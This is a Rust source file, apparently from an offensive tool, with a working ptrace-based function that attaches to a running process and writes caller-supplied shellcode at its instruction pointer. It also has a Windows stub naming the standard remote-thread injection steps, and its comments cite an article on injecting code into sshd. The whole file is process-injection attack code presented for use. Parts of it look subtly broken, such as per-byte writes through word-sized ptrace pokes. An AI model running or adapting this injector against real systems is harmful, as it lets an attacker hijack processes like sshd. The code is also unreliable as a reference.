#[cfg(unix)]
use nix::unistd::*;
#[cfg(unix)]
use nix::sys::ptrace::{attach, getregs, setregs, write, detach, read};
#[cfg(unix)]
use nix::sys::wait::{wait, /*WaitStatus*/};
#[cfg(unix)]
use core::ffi::c_void;
#[cfg(unix)]
use libc::user_regs_struct;
//use std::ptr;
#[cfg(unix)]
use nix::sys::signal::Signal;
//use std::io::Error;

#[cfg(unix)]
pub fn ptrace_inject(pid: i32, shellcode: Vec<u8>, len_shellcode: usize) -> std::io::Result<bool> {
    // http://actes.sstic.org/SSTIC06/Playing_with_ptrace/SSTIC06-article-Bareil-Playing_with_ptrace.pdf
    // https://sudonull.com/post/8186-Introduction-to-ptrace-or-code-injection-in-sshd-for-fun

    let mut success: bool = false;

    //println!("pid: {:#?}", pid);
    let pid: Pid = Pid::from_raw(pid);

    // attach to the process if ptrace has the right and save registers
    let mut regs = match attach(pid) {
        Ok(_r) => {
            let r = wait();
            match r {
                Ok(_) => {},
                Err(_) => {},
            }
            // save register
            getregs(pid).expect("cannot get regs")
        },
        Err(_e) => {
            //println!("{:#?}", e);
            let val: u64 = 0;
            user_regs_struct { r15: val, r14: val, r13: val, r12: val, rbp: val, rbx: val, r11: val, r10: val, r9: val, r8: val, rax: val, rcx: val, rdx: val, rsi: val, rdi: val, orig_rax: val, rip: val, cs: val, eflags: val, rsp: val, ss: val, fs_base: val, gs_base: val, ds: val, es: val, fs: val, gs: val }
        },
    };
    
    //println!("[*] Injecting at rip: {:#?}", regs.rip);

    // inject code
    let mut rip = regs.rip;
    let mut saved_bytes: Vec<u8> = Vec::new();
    
    for byte in 0..len_shellcode {
        let address = rip as *mut c_void;
        let sc_byte = shellcode[byte] as *mut c_void;
        unsafe {
            let v: u8 = match read(pid, address){
                Ok(r) => {r as u8},
                Err(_e) => {90 as u8},
            };
            saved_bytes.push(v);

            match write(pid, address, sc_byte) {
                Ok(_r) => {success = true},
                Err(_e) => {success = false},
            };
        }
        rip = rip + 1;
    }

    println!("{:#?}", saved_bytes);

    // restaure reg that has not been modified ... well
    regs.rip = regs.rip + 2; // because cont or detach will decrement rip by 2
    let r = setregs(pid, regs);
    match r {
        Ok(_) => {},
        Err(_) => {},
    }

    // continue the process
    //cont(pid, Signal::SIGCONT);

    // detach an so continue the execution of the process
    let r= detach(pid, Signal::SIGCONT);

    match r {
        Ok(_) => {},
        Err(_) => {},
    }


    Ok(success)
}

#[cfg(windows)]
pub fn remote_inject(_pid: i32, _shellcode: Vec<u8>, _len_shellcode: usize) -> std::io::Result<bool> {
    // openProcess

    // virtualAllocEx

    // writeProcessMemory

    // createRemoteThread

    let success: bool = false;
    Ok(success)
}